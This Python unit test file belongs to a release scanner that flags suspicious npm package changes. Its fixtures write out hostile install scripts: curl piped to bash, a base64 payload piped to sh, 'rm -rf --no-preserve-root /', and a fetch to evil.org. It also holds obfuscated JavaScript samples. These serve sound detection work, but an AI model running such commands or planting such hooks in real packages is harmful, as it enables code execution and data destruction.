"""Stage 5b unit tests for new signal rules, corroborations, and dependency stats.

All test fixtures use synthetic, harmless strings (Rule 6).
"""

from __future__ import annotations

from release_sentinel.differ import analyze_release, compare_releases
from release_sentinel.extractor import ReleaseContents
from release_sentinel.models import Decision, Severity


def _make_release(
    files: dict[str, str | bytes] | None = None,
    pkg_json: dict | None = None,
) -> ReleaseContents:
    rc_files: dict[str, bytes] = {}
    if pkg_json is not None:
        import json

        rc_files["package.json"] = json.dumps(pkg_json).encode("utf-8")
    if files:
        for k, v in files.items():
            rc_files[k] = v.encode("utf-8") if isinstance(v, str) else v
    return ReleaseContents(files=rc_files)


class TestInlineLifecycleCommandAnalysis:
    """Part 2a: Inline lifecycle command analysis."""

    def test_curl_download_pipe_emits_network_and_executes(self):
        old_rel = _make_release(pkg_json={"name": "pkg-a", "version": "1.0.0"})
        new_rel = _make_release(
            pkg_json={
                "name": "pkg-a",
                "version": "1.0.1",
                "scripts": {"postinstall": "curl -sL https://example.com/setup.sh | bash"},
            }
        )
        ev = compare_releases(old_rel, new_rel)
        ev_ids = {e.id for e in ev}
        assert "install_script_added" in ev_ids
        assert "install_script_network" in ev_ids
        assert "install_script_executes" in ev_ids

    def test_base64_decode_pipe_emits_executes(self):
        old_rel = _make_release(pkg_json={"name": "pkg-b", "version": "1.0.0"})
        new_rel = _make_release(
            pkg_json={
                "name": "pkg-b",
                "version": "1.0.1",
                "scripts": {"install": "echo aGVsbG8= | base64 -d | sh"},
            }
        )
        ev = compare_releases(old_rel, new_rel)
        ev_ids = {e.id for e in ev}
        assert "install_script_added" in ev_ids
        assert "install_script_executes" in ev_ids
        assert "install_script_network" not in ev_ids

    def test_standard_build_command_clean(self):
        old_rel = _make_release(pkg_json={"name": "pkg-c", "version": "1.0.0"})
        new_rel = _make_release(
            pkg_json={
                "name": "pkg-c",
                "version": "1.0.1",
                "scripts": {"install": "node-gyp rebuild"},
            }
        )
        ev = compare_releases(old_rel, new_rel)
        ev_ids = {e.id for e in ev}
        assert "install_script_added" in ev_ids
        assert "install_script_network" not in ev_ids
        assert "install_script_executes" not in ev_ids

    def test_narrowed_rm_rf_benign_build_clean_not_flagged(self):
        old_rel = _make_release(pkg_json={"name": "pkg-clean", "version": "1.0.0"})
        new_rel = _make_release(
            pkg_json={
                "name": "pkg-clean",
                "version": "1.0.1",
                "scripts": {
                    "postinstall": "rm -rf dist && mkdir -p dist && npm run build-cjs && tsc",
                },
            }
        )
        ev = compare_releases(old_rel, new_rel)
        ev_ids = {e.id for e in ev}
        assert "install_script_added" in ev_ids
        assert "install_script_executes" not in ev_ids

    def test_narrowed_rm_rf_dangerous_targets_flagged(self):
        old_rel = _make_release(pkg_json={"name": "pkg-danger", "version": "1.0.0"})
        new_rel = _make_release(
            pkg_json={
                "name": "pkg-danger",
                "version": "1.0.1",
                "scripts": {
                    "preinstall": "sudo rm -rf --no-preserve-root /",
                },
            }
        )
        ev = compare_releases(old_rel, new_rel)
        ev_ids = {e.id for e in ev}
        assert "install_script_executes" in ev_ids

    def test_narrowed_fetch_benign_git_fetch_not_flagged(self):
        old_rel = _make_release(pkg_json={"name": "pkg-fetch", "version": "1.0.0"})
        new_rel = _make_release(
            pkg_json={
                "name": "pkg-fetch",
                "version": "1.0.1",
                "scripts": {
                    "prepare": "git fetch --tags && node scripts/fetch-assets.js",
                },
            }
        )
        ev = compare_releases(old_rel, new_rel)
        ev_ids = {e.id for e in ev}
        assert "install_script_network" not in ev_ids

    def test_narrowed_fetch_network_call_flagged(self):
        old_rel = _make_release(pkg_json={"name": "pkg-fetch2", "version": "1.0.0"})
        new_rel = _make_release(
            pkg_json={
                "name": "pkg-fetch2",
                "version": "1.0.1",
                "scripts": {
                    "postinstall": "node -e \"fetch('https://evil.org/drop').then(r=>r.text())\"",
                },
            }
        )
        ev = compare_releases(old_rel, new_rel)
        ev_ids = {e.id for e in ev}
        assert "install_script_network" in ev_ids


class TestCIWorkflowInjection:
    """Part 2b: CI workflow injection."""

    def test_added_ci_workflow_file_is_medium(self):
        old_rel = _make_release(
            pkg_json={"name": "pkg-ci", "version": "1.0.0"},
            files={"index.js": "module.exports = {};\n"},
        )
        new_rel = _make_release(
            pkg_json={"name": "pkg-ci", "version": "1.0.1"},
            files={
                "index.js": "module.exports = {};\n",
                ".github/workflows/deploy.yml": "name: CI\non: push\n",
            },
        )
        ev = compare_releases(old_rel, new_rel)
        ci_ev = [e for e in ev if e.id == "ci_write"]
        assert len(ci_ev) == 1
        assert ci_ev[0].severity == Severity.MEDIUM

    def test_ci_write_alone_caps_at_warn(self):
        old_rel = _make_release(pkg_json={"name": "pkg-ci", "version": "1.0.0"})
        new_rel = _make_release(
            pkg_json={"name": "pkg-ci", "version": "1.0.1"},
            files={".github/workflows/deploy.yml": "name: CI\non: push\n"},
        )
        ev = compare_releases(old_rel, new_rel)
        from release_sentinel.policy import load_policy

        policy = load_policy()
        from release_sentinel.engine import decide

        decision, _ = decide(ev, policy=policy)
        assert decision == Decision.WARN


class TestObfuscatedCodeDetection:
    """Part 2c: Obfuscated code detection."""

    def test_bulk_hex_identifiers_detected(self):
        old_rel = _make_release(
            pkg_json={"name": "pkg-obf", "version": "1.0.0"},
            files={"index.js": "console.log('clean');\n"},
        )
        # Synthetic harmless hex identifiers
        hex_vars = "\n".join(f"var _0x{i:04x} = {i};" for i in range(25))
        new_rel = _make_release(
            pkg_json={"name": "pkg-obf", "version": "1.0.1"},
            files={"index.js": f"{hex_vars}\nconsole.log(_0x0001);\n"},
        )
        ev = compare_releases(old_rel, new_rel)
        ev_ids = {e.id for e in ev}
        assert "obfuscated_code" in ev_ids

    def test_string_array_rotation_detected(self):
        old_rel = _make_release(
            pkg_json={"name": "pkg-rot", "version": "1.0.0"},
            files={"index.js": "console.log('clean');\n"},
        )
        rot_fn = (
            "var _0x1234 = ['a', 'b', 'c'];\n"
            "(function(_0xa, _0xb) {\n"
            "  var _0xc = function(_0xd) {\n"
            "    while (--_0xd) { _0xa['push'](_0xa['shift']()); }\n"
            "  };\n"
            "  _0xc(++_0xb);\n"
            "})(_0x1234, 1);\n"
        )
        new_rel = _make_release(
            pkg_json={"name": "pkg-rot", "version": "1.0.1"},
            files={"index.js": rot_fn},
        )
        ev = compare_releases(old_rel, new_rel)
        ev_ids = {e.id for e in ev}
        assert "obfuscated_code" in ev_ids

    def test_exempt_path_does_not_flag_obfuscated_code(self):
        old_rel = _make_release(
            pkg_json={"name": "pkg-test", "version": "1.0.0"},
            files={"index.js": "console.log('clean');\n"},
        )
        hex_vars = "\n".join(f"var _0x{i:04x} = {i};" for i in range(25))
        new_rel = _make_release(
            pkg_json={"name": "pkg-test", "version": "1.0.1"},
            files={
                "index.js": "console.log('clean');\n",
                "test/fixture.js": hex_vars,
            },
        )
        ev = compare_releases(old_rel, new_rel)
        ev_ids = {e.id for e in ev}
        assert "obfuscated_code" not in ev_ids


class TestDependencyResolutionStats:
    """Part 0: Dependency resolution tracking."""

    def test_dep_stats_dictionary_passed_and_updated(self):
        old_rel = _make_release(
            pkg_json={"name": "pkg-parent", "version": "1.0.0", "dependencies": {}}
        )
        new_rel = _make_release(
            pkg_json={
                "name": "pkg-parent",
                "version": "1.0.1",
                "dependencies": {"clean-dep": "^1.0.0"},
            }
        )
        from datetime import UTC, datetime
        from pathlib import Path
        from unittest.mock import MagicMock, patch

        mock_client = MagicMock()
        mock_client.get_metadata.return_value = {
            "versions": {
                "1.0.0": {
                    "dist": {
                        "tarball": "http://example.com/clean.tgz",
                        "shasum": "abc",
                    }
                }
            },
            "time": {"1.0.0": "2026-01-01T00:00:00.000Z"},
        }
        mock_client.download_tarball.return_value = Path("dummy.tgz")

        clean_dep_rc = _make_release(
            pkg_json={"name": "clean-dep", "version": "1.0.0"},
            files={"index.js": "module.exports = 1;\n"},
        )
        patch_target = "release_sentinel.dependency_resolver.extract_release_in_memory"
        with patch(patch_target, return_value=clean_dep_rc):
            stats: dict[str, int] = {}
            analyze_release(
                new_rel,
                baseline=old_rel,
                as_of=datetime.now(UTC),
                registry_client=mock_client,
                dep_stats=stats,
            )
            assert stats.get("live") == 1
            assert stats.get("unresolvable", 0) == 0
